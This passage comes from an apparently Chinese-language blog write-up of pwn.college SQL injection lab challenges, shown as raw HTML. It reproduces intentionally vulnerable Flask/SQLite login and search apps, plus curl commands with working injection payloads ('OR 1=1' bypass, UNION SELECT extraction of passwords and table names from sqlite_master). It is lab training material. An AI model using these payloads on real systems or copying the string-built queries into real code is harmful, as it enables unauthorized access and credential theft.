class="string">f&quot;Query: <span class="subst">&#123;query&#125;</span>\nError: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果用户不存在，返回403</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Invalid username or pin&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 登录成功，存储用户信息到会话中</span></span><br><span class="line">    flask.session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.request.path)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="comment"># 处理 GET 请求以显示登录页面或欢迎信息</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (username := flask.session.get(<span class="string">&quot;user&quot;</span>, <span class="literal">None</span>)):</span><br><span class="line">        page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;Welcome to the login service! Please log in as admin to get the flag.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">f&quot;&lt;html&gt;&lt;body&gt;Hello, <span class="subst">&#123;username&#125;</span>!&quot;</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="comment"># 如果用户是 admin，显示旗帜内容</span></span><br><span class="line">            page += <span class="string">&quot;&lt;br&gt;Here is your flag: &quot;</span> + <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;form method=post&gt;</span></span><br><span class="line"><span class="string">        User:&lt;input type=text name=username&gt;PIN:&lt;input type=text name=pin&gt;&lt;input type=submit value=Submit&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)  <span class="comment"># 随机生成会话密钥</span></span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span>  <span class="comment"># 根据用户权限选择端口</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span>  <span class="comment"># 配置服务器名称</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)  <span class="comment"># 启动应用程序</span></span><br><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建一个临时数据库文件</span></span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        <span class="comment"># 执行 SQL 查询</span></span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row  <span class="comment"># 以字典形式返回行</span></span><br><span class="line">        cursor = connection.cursor()</span><br><span class="line">        result = cursor.execute(sql, parameters)</span><br><span class="line">        connection.commit()  <span class="comment"># 提交事务</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">db = TemporaryDB()</span><br><span class="line"><span class="comment"># 创建一个包含 admin 用户的表，PIN 为随机生成的值</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE users AS SELECT &quot;admin&quot; AS username, ? as pin&quot;&quot;&quot;</span>, [random.randrange(<span class="number">2</span>**<span class="number">32</span>, <span class="number">2</span>**<span class="number">63</span>)])</span><br><span class="line"><span class="comment"># 插入一个 guest 用户，PIN 为 1337</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;INSERT INTO users SELECT &quot;guest&quot; as username, 1337 as pin&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_post</span>():</span><br><span class="line">    <span class="comment"># 处理 POST 请求以进行登录</span></span><br><span class="line">    username = flask.request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    pin = flask.request.form.get(<span class="string">&quot;pin&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查请求参数</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `username` form parameter&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pin:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `pin` form parameter&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查 PIN 是否为数字</span></span><br><span class="line">    <span class="keyword">if</span> pin[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;0123456789&quot;</span>:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Invalid pin&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 构造 SQL 查询以验证用户</span></span><br><span class="line">        query = <span class="string">f&#x27;SELECT rowid, * FROM users WHERE username = &quot;<span class="subst">&#123;username&#125;</span>&quot; AND pin = <span class="subst">&#123;pin&#125;</span>&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;query=&#125;</span>&quot;</span>)</span><br><span class="line">        user = db.execute(query).fetchone()  <span class="comment"># 执行查询并获取结果</span></span><br><span class="line">    <span class="keyword">except</span> sqlite3.Error <span class="keyword">as</span> e:</span><br><span class="line">        flask.abort(<span class="number">500</span>, <span class="string">f&quot;Query: <span class="subst">&#123;query&#125;</span>\nError: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果用户不存在，返回403</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Invalid username or pin&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 登录成功，存储用户信息到会话中</span></span><br><span class="line">    flask.session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.request.path)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="comment"># 处理 GET 请求以显示登录页面或欢迎信息</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (username := flask.session.get(<span class="string">&quot;user&quot;</span>, <span class="literal">None</span>)):</span><br><span class="line">        page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;Welcome to the login service! Please log in as admin to get the flag.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">f&quot;&lt;html&gt;&lt;body&gt;Hello, <span class="subst">&#123;username&#125;</span>!&quot;</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="comment"># 如果用户是 admin，显示旗帜内容</span></span><br><span class="line">            page += <span class="string">&quot;&lt;br&gt;Here is your flag: &quot;</span> + <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;form method=post&gt;</span></span><br><span class="line"><span class="string">        User:&lt;input type=text name=username&gt;PIN:&lt;input type=text name=pin&gt;&lt;input type=submit value=Submit&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)  <span class="comment"># 随机生成会话密钥</span></span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span>  <span class="comment"># 根据用户权限选择端口</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span>  <span class="comment"># 配置服务器名称</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)  <span class="comment"># 启动应用程序</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-10-SQLi-2"><a href="#3-10-SQLi-2" class="headerlink" title="3.10 SQLi 2"></a>3.10 SQLi 2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -c cookies.txt -X POST http://challenge.localhost -d &quot;username=admin&amp;password=anything&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --&quot;</span><br><span class="line"></span><br><span class="line">curl -c cookies.txt -X POST http://challenge.localhost -d &quot;username=admin&amp;password=anything&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建一个临时数据库文件</span></span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        <span class="comment"># 连接到 SQLite 数据库，执行 SQL 查询并提交更改</span></span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row  <span class="comment"># 返回字典形式的行</span></span><br><span class="line">        cursor = connection.cursor()</span><br><span class="line">        result = cursor.execute(sql, parameters)  <span class="comment"># 执行 SQL 查询</span></span><br><span class="line">        connection.commit()  <span class="comment"># 提交事务</span></span><br><span class="line">        <span class="keyword">return</span> result  <span class="comment"># 返回查询结果</span></span><br><span class="line"></span><br><span class="line">db = TemporaryDB()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个包含 &quot;admin&quot; 用户和随机生成密码的表</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE users AS SELECT &quot;admin&quot; AS username, ? as password&quot;&quot;&quot;</span>, [os.urandom(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入一个名为 &quot;guest&quot; 的用户，密码为 &quot;password&quot;</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;INSERT INTO users SELECT &quot;guest&quot; as username, &quot;password&quot; as password&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_post</span>():</span><br><span class="line">    <span class="comment"># 处理 POST 请求，提取用户名和密码</span></span><br><span class="line">    username = flask.request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    password = flask.request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查是否缺少 username 或 password 参数</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `username` form parameter&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> password:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `password` form parameter&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 构造 SQL 查询以验证用户和密码</span></span><br><span class="line">        query = <span class="string">f&quot;SELECT rowid, * FROM users WHERE username = &#x27;<span class="subst">&#123;username&#125;</span>&#x27; AND password = &#x27;<span class="subst">&#123;password&#125;</span>&#x27;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;query=&#125;</span>&quot;</span>)  <span class="comment"># 调试信息，输出构造的 SQL 查询</span></span><br><span class="line">        user = db.execute(query).fetchone()  <span class="comment"># 执行查询并获取结果</span></span><br><span class="line">    <span class="keyword">except</span> sqlite3.Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果 SQL 查询出错，返回 500 错误</span></span><br><span class="line">        flask.abort(<span class="number">500</span>, <span class="string">f&quot;Query: <span class="subst">&#123;query&#125;</span>\nError: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果没有找到用户，返回 403 错误</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Invalid username or password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果找到用户，设置 session 并重定向回当前路径</span></span><br><span class="line">    flask.session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.request.path)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="comment"># 处理 GET 请求，显示登录页面或欢迎页面</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (username := flask.session.get(<span class="string">&quot;user&quot;</span>, <span class="literal">None</span>)):</span><br><span class="line">        <span class="comment"># 如果用户没有登录，显示登录页面</span></span><br><span class="line">        page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;Welcome to the login service! Please log in as admin to get the flag.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 如果用户已登录，显示欢迎信息</span></span><br><span class="line">        page = <span class="string">f&quot;&lt;html&gt;&lt;body&gt;Hello, <span class="subst">&#123;username&#125;</span>!&quot;</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="comment"># 如果用户是 admin，显示 flag</span></span><br><span class="line">            page += <span class="string">&quot;&lt;br&gt;Here is your flag: &quot;</span> + <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 显示登录表单</span></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;form method=post&gt;</span></span><br><span class="line"><span class="string">        User:&lt;input type=text name=username&gt;Pass:&lt;input type=text name=password&gt;&lt;input type=submit value=Submit&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机生成 Flask 的会话密钥</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据用户权限设置端口：普通用户使用 8080，root 用户使用 80</span></span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置服务器名称</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 Flask 应用程序，监听 challenge.localhost</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure>

<h3 id="3-11-SQLi-3"><a href="#3-11-SQLi-3" class="headerlink" title="3.11 SQLi 3"></a>3.11 SQLi 3</h3><p>这个是<code>server</code>的原代码，阅读原代码后我们知道当前服务器只有一个<code>GET</code>方法，该方法执行一个查询语句<code>sql = f&#39;SELECT username FROM users WHERE username LIKE &quot;&#123;query&#125;&quot;&#39;</code>，我们如何通过链接查询语句构造查询提取密码呢？</p>
<p>首先要做的是关闭当前查询语句的双引号，并通过<code>UNION</code>合并查询，得到<code>users</code>表中的<code>password</code>字段。</p>
<p><code>curl &quot;http://challenge.localhost:80/?query=%22%20UNION%20SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27%20--&quot;</code>会生成如下<code>SQL</code>语句<code>SELECT username FROM users WHERE username LIKE &quot;&quot; UNION SELECT password FROM users WHERE username=&#39;admin&#39; --&quot;</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)  <span class="comment"># 创建一个Flask应用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建一个临时的SQLite数据库文件，后缀为`.db`</span></span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        <span class="comment"># 连接SQLite数据库，并且使用Row工厂，以便结果可以通过列名访问</span></span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row</span><br><span class="line">        cursor = connection.cursor()  <span class="comment"># 创建一个游标</span></span><br><span class="line">        <span class="comment"># 执行SQL语句，传递参数</span></span><br><span class="line">        result = cursor.execute(sql, parameters)</span><br><span class="line">        connection.commit()  <span class="comment"># 提交更改（如果有）</span></span><br><span class="line">        <span class="keyword">return</span> result  <span class="comment"># 返回查询结果</span></span><br><span class="line"></span><br><span class="line">db = TemporaryDB()  <span class="comment"># 创建一个TemporaryDB实例</span></span><br><span class="line"><span class="comment"># 创建名为`users`的表，并插入一条记录。用户名为&quot;admin&quot;，密码为读取的`/flag`文件内容</span></span><br><span class="line"><span class="comment"># AS SELECT &quot;admin&quot; AS username, ? AS password表示从`/flag`读取内容作为`admin`的密码</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE users AS SELECT &quot;admin&quot; AS username, ? as password&quot;&quot;&quot;</span>, [<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read()])</span><br><span class="line"><span class="comment"># 向`users`表中插入第二条记录，用户名为&quot;guest&quot;，密码为&quot;password&quot;</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;INSERT INTO users SELECT &quot;guest&quot; as username, &quot;password&quot; as password&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)  </span><span class="comment"># 定义Flask路由，处理GET请求</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    <span class="comment"># 从请求参数中获取`query`值，默认为&quot;%&quot;（这表示SQL中的通配符，匹配所有用户名）</span></span><br><span class="line">    query = flask.request.args.get(<span class="string">&quot;query&quot;</span>, <span class="string">&quot;%&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 构建SQL查询语句，用LIKE查询`users`表中符合条件的用户名</span></span><br><span class="line">        sql = <span class="string">f&#x27;SELECT username FROM users WHERE username LIKE &quot;<span class="subst">&#123;query&#125;</span>&quot;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;query=&#125;</span>&quot;</span>)  <span class="comment"># 打印调试信息</span></span><br><span class="line">        <span class="comment"># 执行SQL查询，获取查询结果，将所有用户名拼接为字符串返回</span></span><br><span class="line">        results = <span class="string">&quot;\n&quot;</span>.join(user[<span class="string">&quot;username&quot;</span>] <span class="keyword">for</span> user <span class="keyword">in</span> db.execute(sql).fetchall())</span><br><span class="line">    <span class="keyword">except</span> sqlite3.Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果SQL查询出错，返回错误信息</span></span><br><span class="line">        results = <span class="string">f&quot;SQL error: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回一个HTML页面，包含查询表单、执行的SQL语句和查询结果</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;Welcome to the user query service!</span></span><br><span class="line"><span class="string">        &lt;form&gt;Query:&lt;input type=text name=query value=&#x27;<span class="subst">&#123;query&#125;</span>&#x27;&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Query:&lt;/b&gt; &lt;pre&gt;<span class="subst">&#123;sql&#125;</span>&lt;/pre&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Results:&lt;/b&gt;&lt;pre&gt;<span class="subst">&#123;results&#125;</span>&lt;/pre&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)  <span class="comment"># 生成随机的密钥，用于Flask会话安全</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:80&quot;</span>  <span class="comment"># 设置Flask服务器名</span></span><br><span class="line"><span class="comment"># 启动Flask应用，监听在`challenge.localhost`的80端口</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, <span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-12-SQLi-4"><a href="#3-12-SQLi-4" class="headerlink" title="3.12 SQLi 4"></a>3.12 SQLi 4</h3><p><em>几乎所有现代数据库都会将数据库布局的规范信息存储在一个表中。攻击者可以查询这个表，获取表名、字段名以及他们可能需要的其他信息！</em></p>
<p>这个题目比上一个多一个步骤，就是查询随机生成的总表名，同样，我们使用双引号匹配原代码中的双引号：</p>
<p><code>curl &quot;http://challenge.localhost:80/?query=%25%22%20UNION%20SELECT%20name%20FROM%20sqlite_master%20WHERE%20type%3D%27table%27%20--&quot;</code>命令生成查询：<code>SELECT username FROM &#123;user_table&#125; WHERE username LIKE &quot;%&quot; UNION SELECT name FROM sqlite_master WHERE type=&#39;table&#39; --&quot;</code>获得表名字。</p>
<p>然后就按照表名查询flag、例如我这里的表名为<code>users_4570258226</code></p>
<p><code>curl &quot;http://challenge.localhost:80/?query=admin%22%20UNION%20SELECT%20password%20FROM%20users_4570258226%20WHERE%20username%3D%27admin%27%20--&quot;</code> 生成的SQL查询为<code>SELECT username FROM users_4570258226 WHERE username LIKE &quot;admin&quot; UNION SELECT password FROM users_4570258226 WHERE username=&#39;admin&#39; --&quot;</code></p>
